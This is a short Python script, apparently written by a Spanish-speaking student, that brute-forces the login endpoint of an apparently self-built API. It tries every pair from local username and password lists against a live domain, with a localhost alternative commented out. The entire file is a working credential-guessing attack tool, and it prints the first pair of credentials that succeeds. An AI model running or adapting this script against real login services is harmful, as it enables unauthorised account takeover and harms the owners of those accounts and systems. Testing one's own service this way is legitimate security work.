import requests

# Inspirado por: https://youtu.be/muyWa_XbjN4?t=434

# url = "http://localhost:5000/autenticar"
url = "https://api.arquitecturaccp.com/autenticar"


def login(username, password):
    r = requests.post(url, json={
        "username": username,
        "password": password
    })
    return r


with open('usernames.txt', 'r') as h:
    usernames = [line.strip() for line in h.read().split('\n') if line]

with open('passwords.txt', 'r') as h:
    passwords = [line.strip() for line in h.read().split('\n') if line]

def brute_force():
    for username in usernames:
        for password in passwords:
            resp = login(username, password)
            code = resp.status_code
            print("respesta:{}".format(resp.text))
            if code == 200:
                return "username:{} password:{}".format(username, password)
    return "Nunca respondio status_code: 200"

print(brute_force())
